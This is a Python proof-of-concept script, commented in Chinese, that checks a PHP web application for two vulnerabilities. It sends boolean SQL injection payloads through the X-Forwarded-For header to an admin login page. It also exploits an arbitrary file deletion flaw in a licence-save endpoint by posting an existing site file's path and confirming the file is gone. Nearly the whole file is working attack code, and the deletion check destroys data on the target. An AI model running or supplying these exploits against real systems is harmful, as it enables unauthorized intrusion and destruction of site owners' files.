"""
    测试SQL注入和任意文件删除漏洞是否存在
"""

import requests,sys

class sqlTest(object):
    def __init__(self,url):
        self.keyword = "密码错误次数过多"
        self.url = url
        self.headers = {
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36",
            "Referer":"http://www.t00ls.net"
        }

    def sqltest(self):
        url = self.url+"/admin/logincheck.php"
        # 返回keyword的payload
        payload = "123.123.123.123' or 1=1 #"

        # 不返回keyword的payload
        payload2 = "123.123.123.123' or 1=99 #"

        try:
            self.headers['X-Forwarded-For'] = payload
            res = requests.post(url,headers=self.headers)
            res.encoding = "utf-8"
            #print(url)
            content1 = res.text
            try:
                self.headers['X-Forwarded-For'] = payload2
                #print(self.headers)
                res = requests.post(url,headers=self.headers)
                res.encoding ="utf-8"
                content2 = res.text
                #print(content1)
                #print("==============================================================")
                #print(content2)
                if "密码错误次数过多" in content1 and "用户名或密码错误" in content2:
                    return 1
                else:
                    return 0
            except:
                print("[-] 无法连接到目标站点")
                sys.exit()
        except:
            print("[-] 无法连接到目标站点")
            sys.exit()
class delTest(object):
    def __init__(self,url):
        self.fileList = "fileList.txt"
        self.url = url
        self.headers = {
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36",
            "Referer":"http://www.t00ls.net"
        }
    def deltest(self):
        #print(self.fileList)
        flag = 0
        try:
            for i in open(self.fileList,"r+"):
                if i == "":
                    continue
                i = i.split("\n")[0]
                url = self.url+"/"+i
                code = requests.head(url,headers=self.headers).status_code
                #print(url)
                #print(code)
                if code == 200:
                    flag = 1
                    break
            if flag == 0:
                print("[-] 无常用文件进行删除测试，可手动在fileList.txt中加入测试文件的相对路径")
                sys.exit()
                #print("[_____]")
            del_url = self.url+"/user/licence_save.php?action=modify"
            data={
                #title=1&img=1&oldimg=favicon.ico&id=1
                "title":1,
                "img":1,
                "oldimg":i,
                "id":1
            }
            #print(data)
            requests.post(del_url,headers=self.headers,data=data)
            url = self.url + "/" + i
            code = requests.head(url, headers=self.headers).status_code
            if code == 404:
                return 1
            else :
                return 0
        except Exception as e:
            #print(e)
            print("[-] 无法连接到目标站点")